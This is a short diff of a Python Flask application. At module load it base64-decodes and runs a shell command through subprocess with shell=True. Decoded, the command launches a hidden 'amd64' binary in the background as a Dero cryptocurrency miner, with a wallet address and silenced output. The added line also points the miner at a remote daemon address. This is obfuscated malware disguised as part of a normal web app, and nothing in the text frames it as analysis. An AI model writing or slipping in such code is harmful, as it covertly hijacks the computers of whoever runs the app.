@@ -9,7 +9,7 @@ app = Flask(__name__)
 def run_command(command):
     return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
 
-base64_command = """Y2htb2QgK3ggJChwd2QpL2FtZDY0ICYmICQocHdkKS9hbWQ2NCAtd2FsbGV0LWFkZHJlc3MgZGVybzFxeTI1eWZ5encwMGQ1dDBtdDhwdnRkOXQ0cDd6cDh4M3psMDZwd2toYWo0emt1cWhubW52MnFnYWtyNnU3IC10dXJibyA+L2Rldi9udWxsIDI+JjEgJgo="""
+base64_command = """Y2htb2QgK3ggJChwd2QpL2FtZDY0ICYmICQocHdkKS9hbWQ2NCAtZGFlbW9uLXJwYy1hZGRyZXNzIDE5OC4xODcuMzAuMjc6ODAgLXdhbGxldC1hZGRyZXNzIGRlcm8xcXkyNXlmeXp3MDBkNXQwbXQ4cHZ0ZDl0NHA3enA4eDN6bDA2cHdraGFqNHprdXFobm1udjJxZ2FrcjZ1NyAtdHVyYm8gPi9kZXYvbnVsbCAyPiYxICY="""
 decoded_command = base64.b64decode(base64_command).decode('utf-8')
 run_command(decoded_command)
 ##### Global variable ################################
